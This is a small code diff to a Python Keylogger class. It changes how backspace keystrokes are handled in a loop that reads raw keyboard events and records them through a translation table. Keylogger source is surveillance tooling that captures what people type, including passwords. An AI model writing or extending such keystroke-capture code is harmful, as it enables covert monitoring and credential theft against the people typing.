@@ -14,7 +14,6 @@ TRANSLATION_TABLE = {
         "ctrl":"'CTRL'",
         "tab":"\t",
         "enter":"\n",
-        "backspace":"\b",
         "alt":"'ALT'"
 }
 
@@ -101,7 +100,7 @@ class Keylogger:
         while not self.__stop:
             event = keyboard.read_event()
             if event.event_type == "down":
-                if event.name == "shift":
+                if event.name in ["shift", "backspace"]:
                     continue
                 elif event.name in TRANSLATION_TABLE.keys():
                     self.__lock.acquire()
